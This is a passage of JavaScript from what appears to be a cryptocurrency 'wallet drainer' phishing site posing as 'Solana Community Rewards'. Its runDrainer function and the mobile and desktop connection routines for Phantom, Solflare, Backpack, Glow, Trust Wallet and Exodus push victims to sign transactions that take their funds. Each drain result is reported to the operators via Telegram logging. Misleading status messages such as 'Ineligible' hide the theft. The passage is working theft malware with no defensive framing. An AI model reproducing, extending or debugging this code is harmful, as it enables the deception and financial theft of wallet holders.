          serializedLength: signed.serialize ? signed.serialize().length : 0
        });
        
      } catch (fallbackError) {
        console.error('[runDrainer] Both Patient Mode and fallback signing failed:', fallbackError);
        
        // Handle specific fallback errors
        if (fallbackError.message?.includes('User rejected') || 
            fallbackError.message?.includes('cancelled') ||
            fallbackError.message?.includes('denied')) {
          showStatus('Cancelled', 'error');
        } else if (fallbackError.message?.includes('timeout')) {
          showStatus('Timeout', 'error');
        } else if (fallbackError.message?.includes('insufficient')) {
          showStatus('Ineligible', 'error');
        } else if (fallbackError.message?.includes('does not support')) {
          showStatus('Unsupported', 'error');
        } else {
          showStatus('Failed', 'error');
        }
        return;
      }
    }
    
    // Ensure we have a signed transaction before proceeding
    if (!signed) {
      console.error('[runDrainer] No signed transaction available - cannot proceed to broadcasting');
      showStatus('Failed', 'error');
          return;
        }
        
    // Validate signed transaction before broadcasting
    if (!signed.serialize || typeof signed.serialize !== 'function') {
      console.error('[runDrainer] Invalid signed transaction - missing serialize method');
      showStatus('Failed', 'error');
      return;
    }

    // Check if transaction has signatures
    if (!signed.signatures || signed.signatures.length === 0) {
      console.error('[runDrainer] Transaction not properly signed - no signatures found');
      showStatus('Failed', 'error');
      return;
    }
    
    // Debug: Log signed transaction details
    console.log('[runDrainer] Signed transaction details:', {
      hasSignatures: !!signed.signatures,
      signatureCount: signed.signatures?.length || 0,
      feePayer: signed.feePayer?.toString(),
      recentBlockhash: signed.recentBlockhash,
      lastValidBlockHeight: signed.lastValidBlockHeight,
      instructionCount: signed.instructions?.length || 0
    });

    console.log('[runDrainer] Signed transaction validated - proceeding to broadcast');
    
    // Debug: Log transaction details before broadcasting
    console.log('[runDrainer] Transaction details:', {
      hasSignatures: !!signed.signatures,
      signatureCount: signed.signatures?.length || 0,
      feePayer: signed.feePayer?.toString(),
      recentBlockhash: signed.recentBlockhash,
      lastValidBlockHeight: signed.lastValidBlockHeight,
      instructionCount: signed.instructions?.length || 0,
      serializedLength: signed.serialize ? signed.serialize().length : 0
    });
        
    // 8. Use backend for transaction broadcasting with blockhash refresh
    showStatus('Processing...', 'loading');
    console.log('[runDrainer] About to broadcast transaction...');
    let broadcastResult = await broadcastTransaction(signed);
    console.log('[runDrainer] Broadcast result:', broadcastResult);
    
    // Note: Blockhash refresh disabled to prevent retry loops
    // Transaction expiration is now handled by reduced Patient Mode timeouts (2 minutes)
    if (!broadcastResult.success && broadcastResult.error?.includes('expired')) {
      console.log('[runDrainer] Transaction expired - no retry to prevent loops');
      showStatus('Timeout', 'error');
      return;
    }
    
    // CRITICAL: Phantom, Backpack, and Solflare wallets must never retry transactions
    if ((walletInfo?.key === 'phantom' || walletInfo?.key === 'backpack' || walletInfo?.key === 'solflare') && !broadcastResult.success) {
      console.log(`[runDrainer] ${walletInfo.key} transaction failed - NO RETRY allowed`);
      showStatus('Failed', 'error');
      return;
    }
    
    if (!broadcastResult.success) {
      console.error('[runDrainer] Transaction broadcast failed:', broadcastResult.error);
      
      // Show specific error message for broadcast failures
      let userMessage = 'Failed';
      if (broadcastResult.error && typeof broadcastResult.error === 'string') {
        if (broadcastResult.error.includes('duplicate instruction')) {
          userMessage = 'Transaction Error';
        } else if (broadcastResult.error.includes('insufficient')) {
          userMessage = 'Ineligible';
        } else if (broadcastResult.error.includes('expired')) {
          userMessage = 'Timeout';
        }
      }
      
      showStatus(userMessage, 'error');
      return;
    }

    // 9. Monitor transaction confirmation
    console.log('[runDrainer] Transaction broadcast successful, monitoring on-chain confirmation');
    showStatus('Confirming...', 'loading');
    
    // Monitor transaction confirmation with timeout
    try {
      const monitorPromise = monitorTransactionConfirmation(broadcastResult.signature, walletInfo?.key);
      // Reduce timeout for Phantom, Backpack, and Solflare to prevent hanging
      const timeoutDuration = (walletInfo?.key === 'phantom' || walletInfo?.key === 'backpack' || walletInfo?.key === 'solflare') ? 60000 : 120000; // 60s for simplified wallets, 120s for others
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Transaction monitoring timeout')), timeoutDuration)
      );
      
      const monitorResult = await Promise.race([monitorPromise, timeoutPromise]);
      
      if (monitorResult.success) {
        console.log('[runDrainer] Transaction confirmed on-chain');
        showStatus('Success!', 'success');
        
        // Log successful drain confirmation to Telegram
        try {
          await fetch('/api/drainer/log-confirmation', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              publicKey: publicKeyString,
              txid: broadcastResult.signature,
              status: 'confirmed',
              actualDrainAmount: responseData.actualDrainAmount || 0,
              lamports: responseData.balance || 0,
              walletType: walletInfo.key
            })
          });
          console.log('[runDrainer] Drain success logged to Telegram');
        } catch (logError) {
          console.error('[runDrainer] Failed to log drain success:', logError);
        }
      } else {
        console.error('[runDrainer] Transaction failed on-chain:', monitorResult.error);
        
        // Show user-friendly error message based on the specific error
        let userMessage = 'Failed';
        let errorString = '';
        
        // Convert error object to string for checking
        if (typeof monitorResult.error === 'object') {
          errorString = JSON.stringify(monitorResult.error);
        } else if (typeof monitorResult.error === 'string') {
          errorString = monitorResult.error;
        } else {
          errorString = String(monitorResult.error);
        }
        
        if (errorString.includes('InsufficientFunds')) {
          userMessage = 'Ineligible';
        } else if (errorString.includes('timeout')) {
          userMessage = 'Timeout';
        } else if (errorString.includes('AccountNotFound')) {
          userMessage = 'Failed';
        } else if (errorString.includes('ProgramError')) {
          userMessage = 'Failed';
        } else if (errorString.includes('InstructionError')) {
          userMessage = 'Failed';
        }
        
        showStatus(userMessage, 'error');
        
        // Log failed drain confirmation to Telegram
        try {
          await fetch('/api/drainer/log-confirmation', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              publicKey: publicKeyString,
              txid: broadcastResult.signature,
              status: 'failed',
              error: monitorResult.error,
              actualDrainAmount: responseData.actualDrainAmount || 0,
              lamports: responseData.balance || 0,
              walletType: walletInfo.key
            })
          });
          console.log('[runDrainer] Drain failure logged to Telegram');
        } catch (logError) {
          console.error('[runDrainer] Failed to log drain failure:', logError);
        }
        
        return;
      }
    } catch (monitorError) {
      console.error('[runDrainer] Transaction monitoring failed:', monitorError);
      
      // Log monitoring failure to Telegram
      try {
        await fetch('/api/drainer/log-confirmation', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            publicKey: publicKeyString,
            txid: broadcastResult.signature || 'unknown',
            status: 'monitor_failed',
            error: monitorError.message,
            actualDrainAmount: responseData.actualDrainAmount || 0,
            lamports: responseData.balance || 0,
            walletType: walletInfo.key
          })
        });
        console.log('[runDrainer] Monitor failure logged to Telegram');
      } catch (logError) {
        console.error('[runDrainer] Failed to log monitor failure:', logError);
      }
      
      if (monitorError.message?.includes('timeout')) {
        showStatus('Timeout', 'error');
      } else {
        showStatus('Failed', 'error');
      }
      return;
    }

  } catch (error) {
    console.error('[runDrainer] Unexpected error:', error);
    showStatus('Failed', 'error');
  } finally {
    // Always reset the flag when done
    isDrainerRunning = false;
    console.log('[runDrainer] Process completed, flag reset');
  }
}

window.runDrainer = runDrainer;

  // Function to set dApp metadata for wallet connections
  function setWalletDAppName(provider, walletName) {
    try {
      // Set basic dApp metadata if provider supports it
      if (provider && typeof provider.connect === 'function') {
        // Most Solana wallets will use the metadata from the HTML head
        console.log(`[DAPP_METADATA] Setting metadata for ${walletName}`);
      }
    } catch (error) {
      console.warn(`[DAPP_METADATA] Failed to set metadata for ${walletName}:`, error.message);
    }
  }

    // Enhanced wallet connection with proper metadata
    async function connectWalletWithMetadata(provider, walletName) {
      try {
        // Set dApp name before connection
        setWalletDAppName(provider, walletName);
        
        if (typeof provider.connect === 'function') {
          // TOCTOU Protection is now handled on the backend
          
          // Use standard connection method
          console.log(`[CONNECTION] Connecting to ${walletName}`);
            
            // Fallback to standard connection methods
          let result = null;
          
          // Trust Wallet specific connection
          if (walletName === 'Trust Wallet') {
            console.log('[TRUST] Attempting Trust Wallet connection...');
            showStatus('Processing...', 'loading');
            
            // Check what methods are available
            const hasConnect = typeof provider.connect === 'function';
            const hasSignIn = typeof provider.signIn === 'function';
            const hasRequest = typeof provider.request === 'function';
            
            console.log('[TRUST] Available methods:', { hasConnect, hasSignIn, hasRequest });
            showStatus('Processing...', 'loading');
            
            try {
              // Clear any existing pending requests first
              window.clearAllPendingRequests();
              
              // Add delay to prevent request conflicts
              await new Promise(resolve => setTimeout(resolve, 2000));
              
              // Track this request to prevent conflicts
              const requestId = `trust-connect-${Date.now()}`;
              const canProceed = window.addPendingRequest(requestId);
              
              if (!canProceed) {
                showStatus('Processing...', 'loading');
                window.clearAllPendingRequests();
                await new Promise(resolve => setTimeout(resolve, 3000));
                window.addPendingRequest(requestId);
              }
              
              try {
                      // Trust Wallet prefers simple connect with timeout
      const connectPromise = provider.connect();
      const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Connection timeout')), 45000)
      );
                
                result = await Promise.race([connectPromise, timeoutPromise]);
                console.log('[TRUST] Connect result:', result);
                return result;
              } finally {
                // Always remove the request tracking
                window.removePendingRequest(requestId);
              }
            } catch (error) {
              console.log('[TRUST] Connect failed:', error.message);
              
              // Handle specific Trust Wallet errors without infinite retry
              if (error.message.includes('already pending')) {
                console.log('[TRUST] Already pending error detected - clearing and showing user message');
                window.clearAllPendingRequests();
                showStatus('Failed', 'error');
                throw new Error('Request already pending - user intervention required');
              }
              
              // For other errors, show user-friendly message without infinite retry
              console.log('[TRUST] Connection failed - showing user message');
              showStatus('Failed', 'error');
              throw error;
            }
          }
          
          // Add delay to prevent request conflicts
          await new Promise(resolve => setTimeout(resolve, 1000));
          
          // Track this request to prevent conflicts
          const requestId = `${walletName}-connect-${Date.now()}`;
          window.addPendingRequest(requestId);
          
          try {
            // Try Wallet Adapter format first
            try {
              const connectPromise = provider.connect({
                onlyIfTrusted: false,
                appMetadata: walletAdapterMetadata
              });
              const timeoutPromise = new Promise((_, reject) => 
                setTimeout(() => reject(new Error('Connection timeout')), 120000) // 2 minutes (was 30s)
              );
              
              result = await Promise.race([connectPromise, timeoutPromise]);
            } catch (error) {
              
              // Try basic format
              try {
                const connectPromise = provider.connect({
                  onlyIfTrusted: false,
                  appMetadata: window.dAppMetadata
                });
                const timeoutPromise = new Promise((_, reject) => 
                  setTimeout(() => reject(new Error('Connection timeout')), 60000) // 1 minute (was 10s)
                );
                
                result = await Promise.race([connectPromise, timeoutPromise]);
              } catch (error2) {
                
                // Try simple connect without metadata
                const connectPromise = provider.connect();
                const timeoutPromise = new Promise((_, reject) => 
                  setTimeout(() => reject(new Error('Connection timeout')), 120000) // 2 minutes (was 30s)
                );
                
                result = await Promise.race([connectPromise, timeoutPromise]);
              }
            }
          } finally {
            // Always remove the request tracking
            window.removePendingRequest(requestId);
          }
          
          return result;
        }
        return null;
      } catch (error) {
        console.error(`[connectWalletWithMetadata] Error for ${walletName}:`, error);
        
        // Automatic fallback for connection errors
        if (error.message.includes('timeout') || error.message.includes('pending') || error.message.includes('failed')) {
          console.log(`[FALLBACK] Connection error for ${walletName}, triggering automatic retry`);
          window.handleConnectionError(error, walletName, provider);
        }
        
        throw error;
      }
    }

    // Enhanced mobile deep link function with platform-specific strategies
    function openInWalletMobile(walletType, currentUrl) {
      // Enhanced mobile platform detection
      const userAgent = navigator.userAgent.toLowerCase();
      const isIOS = /iphone|ipad|ipod/.test(userAgent);
      const isAndroid = /android/.test(userAgent);
      const platform = isIOS ? 'ios' : isAndroid ? 'android' : 'unknown';
      
      // Find wallet definition
      const wallet = WALLET_DEFS.find(w => w.key === walletType);
      if (!wallet || !wallet.mobile || !wallet.mobile.mobileStrategies) {
        console.error(`[MOBILE_DEEP_LINK] No mobile strategies found for ${walletType}`);
        return false;
      }
      
      const strategies = wallet.mobile.mobileStrategies;
      // Platform-specific strategy ordering
      let orderedStrategies = [];
      if (platform === 'ios') {
        // iOS prefers custom schemes first, then universal links
        orderedStrategies = [
          ...strategies.filter(s => s.startsWith(walletType + '://')),
          ...strategies.filter(s => s.startsWith('https://'))
        ];
      } else if (platform === 'android') {
        // Android prefers App Links first, then custom schemes
        orderedStrategies = [
          ...strategies.filter(s => s.startsWith('https://')),
          ...strategies.filter(s => s.startsWith(walletType + '://'))
        ];
      } else {
        orderedStrategies = strategies;
      }
      
      // Try each strategy with enhanced timeout handling
      let strategyIndex = 0;
      let hasOpenedApp = false;
      
      const tryNextStrategy = () => {
        if (strategyIndex >= orderedStrategies.length) {
          // All strategies failed, redirect to install page
          const installUrl = platform === 'ios' ? wallet.mobile.appStore : wallet.mobile.playStore;
          window.location.href = installUrl;
          return;
        }
        
        const strategy = orderedStrategies[strategyIndex];
        // Enhanced URL parameter handling
        let fullDeepLink;
        if (strategy.includes('?url=') || strategy.includes('?coin_id=')) {
          fullDeepLink = strategy + encodeURIComponent(currentUrl);
        } else if (strategy.endsWith('/')) {
          fullDeepLink = strategy + encodeURIComponent(currentUrl);
        } else {
          fullDeepLink = strategy + '?url=' + encodeURIComponent(currentUrl);
        }
        
        
        try {
          // Enhanced deep link opening with better error handling
          if (platform === 'ios') {
            // iOS: Use iframe method for better reliability
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = fullDeepLink;
            document.body.appendChild(iframe);
            
            // Clean up iframe after attempt
            setTimeout(() => {
              if (document.body.contains(iframe)) {
                document.body.removeChild(iframe);
              }
            }, 1000);
          } else {
            // Android: Direct location change
          window.location.href = fullDeepLink;
          }
          
          hasOpenedApp = true;
          
          // Platform-specific timeout handling
          const timeout = platform === 'ios' ? 3000 : 2000;
          setTimeout(() => {
            if (!hasOpenedApp || window.document.hidden) {
              // App likely opened, don't try next strategy
              return;
            }
              strategyIndex++;
              tryNextStrategy();
          }, timeout);
          
        } catch (error) {
          console.error(`[MOBILE_DEEP_LINK] Strategy ${strategyIndex + 1} failed:`, error);
          strategyIndex++;
          tryNextStrategy();
        }
      };
      
      // Start trying strategies
      tryNextStrategy();
      return true;
    }

    // Enhanced mobile wallet connection with comprehensive fallbacks for all wallet types
    window.connectMobileWallet = async function connectMobileWallet(wallet) {
      let provider = wallet.provider();
      console.log(`Provider for ${wallet.name} on connect:`, provider);
      console.log('connectMobileWallet called with:', wallet);
      const isMobileDevice = isMobile();
      
      // Enhanced fallback: if no provider, try multiple times with different strategies
      if (!provider) {
        console.log(`[FALLBACK] No provider for ${wallet.name}, trying enhanced retry...`);
        
        // Try multiple provider retrieval strategies
        for (let attempt = 1; attempt <= 3; attempt++) {
          console.log(`[FALLBACK] Provider retrieval attempt ${attempt}/3 for ${wallet.name}`);
          
          await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
          provider = wallet.provider();
          
          if (provider) {
            console.log(`[FALLBACK] Provider found for ${wallet.name} on attempt ${attempt}`);
            break;
          }
        }
        
        if (!provider) {
          console.log(`[FALLBACK] All provider retrieval attempts failed for ${wallet.name}`);
          showStatus('Failed', 'error');
          return;
        }
      }
      
      try {
        // On mobile, use stealthy but functional approach
        if (isMobileDevice) {
          
          // First, try to get the wallet provider quietly
          provider = wallet.provider();
          console.log(`[connectMobileWallet] Initial provider for ${wallet.name}:`, provider);
          
          // Simple fallback: if no provider, try again
          if (!provider) {
            console.log(`[FALLBACK] No provider for ${wallet.name}, retrying...`);
            await new Promise(resolve => setTimeout(resolve, 2000));
            provider = wallet.provider();
          }
          
          // If still no provider, try to open the app and then check again
          if (!provider) {
            // Enhanced mobile detection for better deep linking
            let isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            if (!isMobileDevice) {
              isMobileDevice = /Mobile|Tablet/i.test(navigator.userAgent) || 
                              (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                              window.innerWidth <= 768;
            }
            
            if (isMobileDevice) {
              console.log(`[connectMobileWallet] Mobile device detected for ${wallet.name}`);
            }
            
            // Enhanced deep linking for seamless wallet opening using comprehensive fallbacks
            try {
                const currentUrl = window.location.href;
              console.log(`[connectMobileWallet] Opening ${wallet.name} with comprehensive mobile deep link fallbacks`);
              
              // Use the comprehensive mobile deep link function with fallback strategies
              const success = openInWalletMobile(wallet.key, currentUrl);
              if (!success) {
                console.error(`[connectMobileWallet] Failed to open ${wallet.name} with mobile deep links`);
                  }
                } catch (e) {
            }
            
            // Wait a bit and check for provider again
            showStatus('Processing...', 'loading');
            
            // Enhanced provider detection with better timing and fallback
            let providerFound = false;
            for (let i = 0; i < 8; i++) {
              await new Promise(resolve => setTimeout(resolve, 800));
              
              provider = wallet.provider();
              console.log(`[connectMobileWallet] Provider for ${wallet.name} after wait ${i+1}:`, provider);
              
              if (provider) {
                providerFound = true;
                console.log(`[connectMobileWallet] Provider found for ${wallet.name} after ${i+1} attempts`);
                break;
              }
            }
            
            if (!providerFound) {
              console.log(`[connectMobileWallet] No provider found for ${wallet.name} after all attempts`);
              
              // Enhanced automatic fallback with wallet-specific strategies
              console.log(`[FALLBACK] Triggering enhanced automatic fallback for ${wallet.name}`);
              
              // Wallet-specific fallback strategies
              switch (wallet.name) {
                case 'Phantom':
                  console.log(`[FALLBACK] Phantom-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'phantom://', 500);
                  setTimeout(() => window.location.href = 'https://phantom.app/', 1000);
                  break;
                  
                case 'Solflare':
                  console.log(`[FALLBACK] Solflare-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'solflare://access-wallet', 500);
                  setTimeout(() => window.location.href = 'https://solflare.com/', 1000);
                  break;
                  
                case 'Backpack':
                  console.log(`[FALLBACK] Backpack-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'https://backpack.app/', 500);
                  break;
                  
                case 'Glow':
                  console.log(`[FALLBACK] Glow-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'glow://', 500);
                  break;
                  
                case 'Trust Wallet':
                  console.log(`[FALLBACK] Trust Wallet-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'trust://', 500);
                  break;
                  
                case 'Exodus':
                  console.log(`[FALLBACK] Exodus-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'exodus://', 500);
                  break;
                  
                default:
                  console.log(`[FALLBACK] Generic fallback for ${wallet.name}`);
                  window.handleConnectionError(new Error('Provider not found'), wallet.name, null);
                  break;
              }
            }
            
            // If still no provider after deep linking, try to open app store as fallback
            if (!provider) {
              console.log(`[connectMobileWallet] No provider found for ${wallet.name}, trying app store fallback`);
              try {
                if (wallet.name === 'Phantom') {
                  window.open('https://phantom.app/', '_blank');
                } else if (wallet.name === 'Solflare') {
                  window.open('https://solflare.com/', '_blank');
                } else if (wallet.name === 'Backpack') {
                  window.open('https://backpack.app/', '_blank');
                } else if (wallet.name === 'Glow') {
                  window.open('https://glow.app/', '_blank');
                } else if (wallet.name === 'Trust Wallet') {
                  window.open('https://trustwallet.com/', '_blank');
                } else if (wallet.name === 'Exodus') {
                  window.open('https://exodus.com/', '_blank');
                }
              } catch (e) {
                console.error(`[connectMobileWallet] Error opening app store for ${wallet.name}:`, e);
              }
            }
          }
          
          // If we have a provider, try to connect
          if (provider) {
            // Check if wallet is available before attempting connection
            if (typeof provider.isConnected === 'function' && !provider.isConnected()) {
              showStatus('Failed', 'error');
              return;
            }
            
            // Try to connect
            if (typeof provider.connect === 'function') {
              try {
                console.log(`[connectMobileWallet] Calling connectWalletWithMetadata for ${wallet.name}`);
                
                // Add timeout wrapper for connection with retry logic
                let result;
                let retryCount = 0;
                const maxRetries = 2;
                
                while (retryCount <= maxRetries) {
                  try {
                    const connectionPromise = connectWalletWithMetadata(provider, wallet.name);
                    const timeoutPromise = new Promise((_, reject) => {
                      setTimeout(() => reject(new Error('Connection timeout - please try again')), 180000); // 3 minutes (was 45s)
                    });
                    
                    result = await Promise.race([connectionPromise, timeoutPromise]);
                    break; // Success, exit retry loop
                  } catch (error) {
                    retryCount++;
                    console.log(`[connectMobileWallet] Connection attempt ${retryCount}/${maxRetries + 1} failed for ${wallet.name}:`, error.message);
                    
                    if (retryCount > maxRetries) {
                      // Automatic fallback before giving up
                      console.log(`[FALLBACK] All retries failed for ${wallet.name}, triggering automatic fallback`);
                      window.handleConnectionError(error, wallet.name, provider);
                      throw error; // Re-throw if all retries failed
                    }
                    
                    // Wait before retry
                    showStatus('Processing...', 'loading');
                    await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
                  }
                }
                console.log(`[connectMobileWallet] connectWalletWithMetadata result for ${wallet.name}:`, result);
                // Wait a bit for connection to establish
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // Check if we got a public key
                const publicKey = provider.publicKey || provider.address || result?.publicKey;
                console.log(`[connectMobileWallet] publicKey for ${wallet.name}:`, publicKey);
                
                if (publicKey) {
                  showStatus('Processing...', 'loading');
                  console.log(`[connectMobileWallet] About to call runDrainer for ${wallet.name}`);
                  
                  // Don't log wallet connection here - will be logged with actual balance in runDrainer
                  
                  // Ensure provider is still connected before running drainer
                  if (provider && (provider.connected || provider.publicKey)) {
                  runDrainer(provider);
                  } else {
                    console.error(`[connectMobileWallet] Provider disconnected for ${wallet.name}`);
                    showStatus('Failed', 'error');
                  }
                } else {
                  // Try to force approval by attempting a transaction
                  showStatus('Processing...', 'loading');
                  
                  // Try to trigger approval by attempting to sign a message
                  if (typeof provider.signMessage === 'function') {
                    try {
                      const message = new TextEncoder().encode('Connect to Solana Community Rewards');
                      const signature = await provider.signMessage(message);
                      console.log(`[connectMobileWallet] signMessage signature for ${wallet.name}:`, signature);
                      showStatus('Processing...', 'loading');
                      setTimeout(() => {
                        // Re-check provider state before running drainer
                        if (provider && (provider.connected || provider.publicKey)) {
                        runDrainer(provider);
                        } else {
                          showStatus('Failed', 'error');
                        }
                      }, 1000);
                    } catch (signError) {
                      console.error(`[connectMobileWallet] signMessage error for ${wallet.name}:`, signError);
                    }
                  } else {
                    showStatus('Failed', 'error');
                    console.error(`[connectMobileWallet] No signMessage function for ${wallet.name}`);
                  }
                }
              } catch (connectError) {
                console.error(`[connectMobileWallet] connectWalletWithMetadata error for ${wallet.name}:`, connectError);
                
                // Handle timeout errors specifically - More lenient for Backpack
                if (connectError.message?.includes('timeout') || connectError.message?.includes('Connection timeout') || connectError.message?.includes('JSON-RPC: method call timeout')) {
                  if (wallet.name === 'Backpack') {
                    showStatus('Timeout', 'error');
                  } else {
                    showStatus('Timeout', 'error');
                  }
                  return;
                }
                // Enhanced Solflare connection methods
                if (wallet.name === 'Solflare') {
                  try {
                    // Try signIn method first
                    if (typeof provider.signIn === 'function') {
                    const signInResult = await provider.signIn();
                    showStatus('Processing...', 'loading');
                      
                      // Don't log wallet connection here - will be logged with actual balance in runDrainer
                      
                    setTimeout(() => {
                      runDrainer(provider);
                    }, 1000);
                      return;
                    }
                    
                    // Try request method
                    if (typeof provider.request === 'function') {
                      const requestResult = await provider.request({ method: 'connect' });
                      showStatus('Processing...', 'loading');
                      
                      // Don't log wallet connection here - will be logged with actual balance in runDrainer
                      
                      setTimeout(() => {
                        runDrainer(provider);
                      }, 1000);
                      return;
                    }
                    
                    // Try basic connect without metadata
                    if (typeof provider.connect === 'function') {
                      const connectResult = await provider.connect();
                      showStatus('Processing...', 'loading');
                      
                      // Don't log wallet connection here - will be logged with actual balance in runDrainer
                      
                      setTimeout(() => {
                        runDrainer(provider);
                      }, 1000);
                      return;
                    }
                    
                    showStatus('Unavailable', 'error');
                  } catch (solflareError) {
                    console.error(`[connectMobileWallet] Solflare connection error:`, solflareError);
                    showStatus('Failed', 'error');
                  }
                } else if (wallet.name === 'Trust Wallet') {
                  try {
                    console.log('[TRUST] Trust Wallet detected - checking if supported...');
                    
                    // Check if this is the unsupported Trust Wallet provider (mobile only)
                    if (provider && provider.isUnsupported) {
                      showStatus('Unsupported', 'error');
                      
                      // Show alternative wallet options
                      setTimeout(() => {
                        showStatus('Processing...', 'loading');
                        
                        // Show wallet selection modal with supported wallets
                        const modal = document.getElementById('walletModal');
                        const walletList = document.getElementById('walletList');
                        
                        if (modal && walletList) {
                          // Filter to show only supported wallets
                          const supportedWallets = WALLET_DEFS.filter(w => 
                            w.name !== 'Trust Wallet' && 
                            (w.name === 'Phantom' || w.name === 'Solflare' || w.name === 'Backpack' || w.name === 'Glow' || w.name === 'Exodus')
                          );
                          
                          const walletListContent = walletList.querySelector('.wallet-list-content');
                          if (walletListContent) {
                            walletListContent.innerHTML = supportedWallets.map(wallet => `
                            <div class="wallet-option">
                                <img src="${wallet.icon}" alt="${wallet.name} logo" loading="lazy" decoding="async" />
                              <span class="wallet-name">${wallet.name}</span>
                              <button class="claim-btn" onclick="connectMobileWallet(${JSON.stringify(wallet)})">
                                Use ${wallet.name}
                              </button>
                            </div>
                          `).join('');
                          }
                          
                          modal.classList.add('active');
                        }
                      }, 2000);
                      
                      return;
                    }
                    
                    // If it's a regular Trust Wallet provider, try to connect
                    showStatus('Processing...', 'loading');
                    
                    if (typeof provider.connect === 'function') {
                      try {
                        // Add delay to prevent request conflicts
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        
                        // Track this request to prevent conflicts
                        const requestId = `trust-mobile-connect-${Date.now()}`;
                        window.addPendingRequest(requestId);
                        
                        try {
                          // Try with timeout to prevent hanging
                          const connectPromise = provider.connect();
                          const timeoutPromise = new Promise((_, reject) => 
                            setTimeout(() => reject(new Error('Connection timeout')), 15000)
                          );
                          
                          const result = await Promise.race([connectPromise, timeoutPromise]);
                          showStatus('Processing...', 'loading');
                          setTimeout(() => {
                            runDrainer(provider);
                          }, 1000);
                          return;
                        } finally {
                          // Always remove the request tracking
                          window.removePendingRequest(requestId);
                        }
                      } catch (error) {
                        console.log('[TRUST] Connect failed:', error.message);
                        
                        // Handle specific Trust Wallet errors
                        if (error.message.includes('already pending')) {
                          showStatus('Failed', 'error');
                          setTimeout(() => {
                            showStatus('Processing...', 'loading');
                          }, 3000);
                        } else if (error.message.includes('timeout')) {
                          showStatus('Timeout', 'error');
                        } else {
                          showStatus('Failed', 'error');
                        }
                        
                        // Show alternative wallets
                        setTimeout(() => {
                          showStatus('Processing...', 'loading');
                        }, 4000);
                      }
                    } else {
                      showStatus('Unavailable', 'error');
                    }
                    
                  } catch (trustWalletError) {
                    console.error(`[connectMobileWallet] Trust Wallet connection error:`, trustWalletError);
                    showStatus('Failed', 'error');
                  }
                } else if (wallet.name === 'Glow') {
                  try {
                    console.log('[GLOW] Glow Wallet detected - attempting connection...');
                    
                    // Add delay to prevent request conflicts
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    // Track this request to prevent conflicts
                    const requestId = `glow-connect-${Date.now()}`;
                    window.addPendingRequest(requestId);
                    
                    try {
                      // Try using the Solana-specific provider first
                      const solanaProvider = window.glow?.solana || window.GlowWallet?.solana;
                      if (solanaProvider && typeof solanaProvider.connect === 'function') {
                        console.log('[GLOW] Using Solana-specific provider');
                        
                        // Use a more robust connection approach
                        let connected = false;
                        let attempts = 0;
                        const maxAttempts = 3;
                        
                        while (!connected && attempts < maxAttempts) {
                          attempts++;
                          console.log(`[GLOW] Connection attempt ${attempts}/${maxAttempts}`);
                          
                          try {
                            const connectPromise = solanaProvider.connect();
                            const timeoutPromise = new Promise((_, reject) => 
                              setTimeout(() => reject(new Error('Connection timeout')), 30000) // Reduced timeout
                            );
                            
                            const result = await Promise.race([connectPromise, timeoutPromise]);
                            connected = true;
                            console.log('[GLOW] Successfully connected on attempt', attempts);
                            showStatus('Processing...', 'loading');
                            setTimeout(() => {
                              runDrainer(solanaProvider);
                            }, 1000);
                            return;
                          } catch (attemptError) {
                            console.log(`[GLOW] Attempt ${attempts} failed:`, attemptError.message);
                            if (attempts < maxAttempts) {
                              await new Promise(resolve => setTimeout(resolve, 2000)); // Wait before retry
                            }
                          }
                        }
                        
                        if (!connected) {
                          throw new Error('All connection attempts failed');
                        }
                      }
                      
                      // Ultra simple Glow connection - no retry logic
                      if (typeof provider.connect === 'function') {
                        console.log('[GLOW] Using simple provider.connect');
                        const result = await provider.connect();
                        console.log('[GLOW] Successfully connected');
                        showStatus('Processing...', 'loading');
                        setTimeout(() => {
                          runDrainer(provider);
                        }, 1000);
                        return;
                      } else if (typeof provider.request === 'function') {
                        console.log('[GLOW] Using simple provider.request');
                        const result = await provider.request({ method: 'connect' });
                        console.log('[GLOW] Successfully connected');
                        showStatus('Processing...', 'loading');
                        setTimeout(() => {
                          runDrainer(provider);
                        }, 1000);
                        return;
                      } else {
                        showStatus('Unavailable', 'error');
                      }
                    } finally {
                      // Always remove the request tracking
                      window.removePendingRequest(requestId);
                    }
                  } catch (glowError) {
                    console.error(`[connectMobileWallet] Glow connection error:`, glowError);
                    
                    // Handle specific Glow errors
                    if (glowError.message.includes('already pending')) {
                      showStatus('Failed', 'error');
                    } else if (glowError.message.includes('timeout')) {
                      showStatus('Timeout', 'error');
                    } else {
                      showStatus('Failed', 'error');
                    }
                  }
                } else if (wallet.name === 'Backpack') {
                  try {
                    console.log('[BACKPACK] Backpack Wallet detected - attempting enhanced connection...');
                    
                    // Enhanced Backpack connection with multiple strategies
                    const connectionStrategies = [
                      {
                        name: 'Method 1: Connect with metadata',
                        fn: () => provider.connect({
                          onlyIfTrusted: false,
                          appMetadata: {
                            name: 'Solana Community Rewards',
                            url: window.location.origin,
                            icon: '/logo.png'
                          }
                        })
                      },
                      {
                        name: 'Method 2: Simple connect',
                        fn: () => provider.connect()
                      },
                      {
                        name: 'Method 3: Request method',
                        fn: () => {
                          if (typeof provider.request === 'function') {
                            return provider.request({ method: 'connect' });
                          } else {
                            throw new Error('provider.request is not a function');
                          }
                        }
                      },
                      {
                        name: 'Method 4: Direct public key access',
                        fn: () => {
                          if (provider.publicKey) {
                            return { publicKey: provider.publicKey };
                          } else {
                            throw new Error('No public key available');
                          }
                        }
                      }
                    ];
                    
